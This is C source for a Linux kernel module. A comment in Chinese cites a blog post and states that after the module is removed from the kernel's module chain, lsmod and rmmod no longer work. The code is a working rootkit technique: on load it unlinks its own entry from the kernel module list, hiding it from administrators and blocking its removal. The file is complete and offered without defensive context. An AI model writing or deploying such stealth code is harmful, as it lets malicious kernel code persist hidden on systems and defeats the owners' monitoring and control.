//  去掉模块链后，lsmod和rmmod都不起作用了
//
//  http://www.blogbus.com/debug-sai-logs/49461512.html
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/module.h>
#include <linux/moduleparam.h>
#include <linux/unistd.h>
#include <linux/types.h>
#include <linux/sched.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/file.h>
#include <linux/fs.h>
#include <linux/string.h>
#include <linux/list.h>
#include <linux/kallsyms.h>
#include <asm/uaccess.h>

MODULE_LICENSE("Dual BSD/GPL");
#define _DEBUG
#ifdef _DEBUG
#define kprintk(fmt,args...) printk(KERN_DEBUG fmt,##args)
#define kprintf(fmt,args...) printf(fmt,##args)
#define kperror(str) perror(str)
#else
#define kprintk
#define kprintf
#define kperror
#endif

static int patch_init(void);

void hidemodule(void)
{
    struct module *head = &__this_module;
    struct module *next;

    next = head;

    do
    {
        if((int)(next->init) == (int)patch_init)
        {
            kprintk("find module,hide it\n");
            list_del(&next->list);
            break;
        }else
        {
            struct list_head * entry = next->list.next;
            next = container_of(entry,struct module,list);
        }

    }while(next != head);
}

static int patch_init(void)
{
    hidemodule( );
    return 0;
}


static void patch_cleanup(void)
{
}

module_init(patch_init);
module_exit(patch_cleanup);
